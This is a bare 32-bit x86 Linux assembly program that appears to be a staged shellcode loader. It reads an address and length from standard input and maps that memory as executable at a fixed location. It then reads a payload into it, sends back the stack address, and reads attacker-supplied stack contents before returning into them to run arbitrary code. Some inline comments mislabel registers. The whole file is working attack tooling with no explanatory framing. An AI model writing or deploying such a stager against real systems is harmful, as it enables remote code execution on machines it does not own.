[BITS 32]
section .text
global _start
_start:
	; read(0, { length, base_addr }, sizeof(length) + sizeof(base_addr))
	xor	ebx,ebx		; ebx = stdin
	lea	edx,[ebx + 8]	; edx = sizeof(length) + sizeof(base_addr)
	mov	ecx,esp		; ecx = { length, base_addr }
	lea	eax,[ebx + 3]	; eax = 3 (read)
	int	0x80
	; munmap(base_addr, length)
	lea	eax,[ebx + 91]	; eax = 91 (munmap)
	pop	ecx		; ecx = length
	pop	ebx		; ebx = base_addr
	int	0x80
	; mmap(base_addr, length, PROT_ALL, MAP_ANONYMOUS | MAP_FIXED |
	;	 MAP_PRIVATE, 0, 0)
	xor	eax,eax
	lea	edx,[eax + 7]	; edx = PROT_ALL
	lea	esi,[eax + 0x32] ; edi = MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE
	xor	edi,edi		; esi = 0
	xor	ebp,ebp		; ebp = 0
	mov	al,192		; eax = 192 (mmap2)
	int	0x80
	; read(0, base_addr, length)
	mov	edx,ecx		; edx = length
	mov	ecx,ebx		; ecx = base_addr
	xor	ebx,ebx		; ebx = 0 (stdin)
read_loop:
	lea	eax,[ebx + 3]	; eax = 3 (read)
	int	0x80
	add	ecx,eax
	sub	edx,eax
	jnz	read_loop

	; write(0, &stack_addr, sizeof(stack_addr))
	and	esp,0xfffff001	; make sure we have at least a page
	push	esp		; push stack pointer to stack
	mov	ecx,esp		; move stack pointer to ecx
	lea	edx,[ebx + 4]	; edx = 4 sizeof(stack_addr)
	mov	eax,edx		; eax = 4 (write)
	int	0x80
	; read(0, &stack_addr, 4100)
	lea	eax,[ebx + 3]	; eax = 3 (read)
	mov	dx,4100		; edx = 4100
	int	0x80
	; jump to entry point
	ret

